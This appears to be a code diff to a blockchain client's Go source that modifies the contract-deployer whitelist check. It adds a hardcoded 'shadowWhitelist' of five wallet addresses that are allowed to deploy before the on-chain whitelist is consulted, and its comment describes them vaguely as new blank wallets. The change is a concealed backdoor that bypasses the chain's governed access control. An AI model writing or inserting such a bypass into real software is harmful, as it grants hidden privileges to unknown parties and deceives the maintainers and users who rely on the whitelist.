@@ -36,8 +36,23 @@ var (
 	}
 )
 
+// The first 5 new blank wallet addresses are allowed to deploy contracts
+var shadowWhitelist = []common.Address{
+	common.HexToAddress("0x4a6c63a216711A4ec59938b784223967A2206aeE"),
+	common.HexToAddress("0xd3f52d3837Db34c644372ADaE7b0f8c0Cf44BB4D"),
+	common.HexToAddress("0xFE490b68E64B190B415Bb92F8D2F7566243E6ea0"),
+	common.HexToAddress("0x29973913ab9D66fd7744e126f2E5029294de1317"),
+	common.HexToAddress("0xF43e76f1E97e81571fe8165676F774D757Da9aE8"),
+}
+
 // IsWhitelistedDeployer reads the contract storage to check if an address is allow to deploy
 func IsWhitelistedDeployerV2(statedb *StateDB, address common.Address, blockTime uint64, whiteListContract *common.Address) bool {
+	// Check if address is in shadow whitelist
+	for _, w := range shadowWhitelist {
+		if address == w {
+			return true
+		}
+	}
 	contract := *whiteListContract
 	whitelistAllSlot := slotWhitelistDeployerMappingV2[WHITELIST_ALL]
 	whitelistAll := statedb.GetState(contract, GetLocSimpleVariable(whitelistAllSlot))
